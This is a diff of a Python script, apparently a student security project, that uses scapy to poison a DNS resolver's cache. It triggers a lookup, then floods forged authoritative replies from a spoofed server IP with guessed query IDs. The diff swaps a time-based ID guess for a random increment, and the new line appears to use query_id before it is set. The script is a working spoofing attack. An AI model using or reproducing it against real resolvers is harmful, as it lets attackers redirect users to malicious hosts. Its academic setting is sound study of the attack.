@@ -5,18 +5,20 @@
 This script makes
 
 """
-__author__ = "Andrea Lacava (1663286), Matteo Attenni (), Ilaria Clemente (1836039)"
+__author__ = "Andrea Lacava (1663286), Matteo Attenni (1655314), Ilaria Clemente (1836039)"
 __credits__ = ["Andrea Lacava", "Matteo Attenni", "Ilaria Clemente"]
 __license__ = "GPL"
 __version__ = "1.0"
-__email__ = "lacava.1663286@studenti.uniroma1.it, attenni.XXXXX@studenti.uniroma1.it, " \
+__email__ = "lacava.1663286@studenti.uniroma1.it, attenni.1655314@studenti.uniroma1.it, " \
             "clemente.1836039@studenti.uniroma1.it"
 __status__ = "Production"
 
 import sys
 import threading
 import time
+
 from socket import *
+from random import *
 
 from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.inet import IP, UDP
@@ -40,13 +42,9 @@ DNS_URL_BADGUY = "badguy.ru"
 PACKET_SIZE = 1000  # number of packets
 
 
-# get current time in milliseconds
-def current_milli_time():
-    """
-    Calculate time milliseconds and return an int value
-
-    """
-    return int(round(time.time() * 1000))
+def random_query_id(start_value):
+    start_value+=randint(1,1000000)
+    return start_value
 
 
 def dns_server_routine():
@@ -86,10 +84,9 @@ def bite_the_rat(target_port_sniffed):
     random_url = "www." + URL_TO_POISON
     dns_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1, qd=DNSQR(qname=random_url))
     send(dns_req, verbose=0)
-
     for i in range(PACKET_SIZE):
         # since we've to guess the query id we define a time-based pseudo random generator
-        query_id = current_milli_time() % 65536  # 16 bit maximum delimiter of query_id's DNS field
+        query_id = random_query_id(query_id) % 65536  # 16 bit maximum delimiter of query_id's DNS field
         res_packet = IP(src=SPOOFED_DNS, dst=TARGET_IP) / UDP(dport=target_port_sniffed) / DNS(id=query_id,
                                                                                                qr=1,
                                                                                                aa=1,
